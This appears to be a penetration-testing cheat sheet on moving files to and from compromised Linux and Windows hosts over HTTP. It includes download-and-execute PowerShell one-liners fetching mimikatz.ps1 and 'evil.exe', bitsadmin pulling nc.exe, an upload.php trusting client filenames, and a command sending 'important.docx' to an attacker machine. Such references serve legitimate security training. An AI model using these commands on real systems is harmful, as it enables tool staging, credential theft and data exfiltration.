# HTTP

## HTTP Linux Server

```
python -m SimpleHTTPServer 80
python3 -m http.server 80
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
```

## HTTP/FTP wget from linux

```
wget http://ip-addr[:port]/file[-o output-file]
```

#### A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and --ftp-password=pass.

## HTTP curl from linux/OSX

```
curl http://ip:port/file -o outfile
```

## HTTP powershell from windows

#### oneliner command:

```
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```

#### powershell script:

```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

#### to run the script:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

#### download and execute a PowerShell script without saving it to disk ( only for powershell scripts)

```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

or

```
(new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.ps1') | IEX
```

## http certutil from windows

```
certutil -urlcache -split -f "http://ip-addr:port/file" .[output-file]
```

{% hint style="info" %}
remember to type the dot "." before output file name
{% endhint %}

## http bitsadmin from windows

```
bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
```

## http wget from windows (wrapper for WebClient)

{% hint style="info" %}
**Win 8 and later PS Invoke-WebRequest**
{% endhint %}

```
wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"
```

## http VBscript from windows

#### run these commands in order to create a vbscrtipt for downloading a file

```

echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs
```

#### To run our wget.vbs script

```
cscript wget.vbs http://ip-addr:port/file output-file
```

## Windows Uploads Using Windows Scripting Languages

#### since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShell class to upload data to our Kali machine through an HTTP POST request create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:will process an incoming file upload request and save the transferred data to the /var/www/uploads/ directory.

```
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

```
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

#### in windows:

```
C:\Users> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```
